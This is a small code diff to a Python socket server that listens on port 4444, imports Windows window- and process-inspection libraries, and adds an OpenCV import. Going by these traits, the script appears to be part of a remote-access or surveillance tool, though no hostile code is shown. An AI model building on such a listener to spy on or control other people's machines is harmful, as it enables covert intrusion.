@@ -9,6 +9,7 @@ import threading
 import win32gui
 import win32process
 import psutil
+import cv2
 
 host = "0.0.0.0"
 port = 4444
@@ -97,5 +98,5 @@ async def main():
         conn, addr = s.accept()
         print(f"[+] Connexion établie avec {addr[0]}")
         await handle_client(conn)
-
+        
 asyncio.run(main())
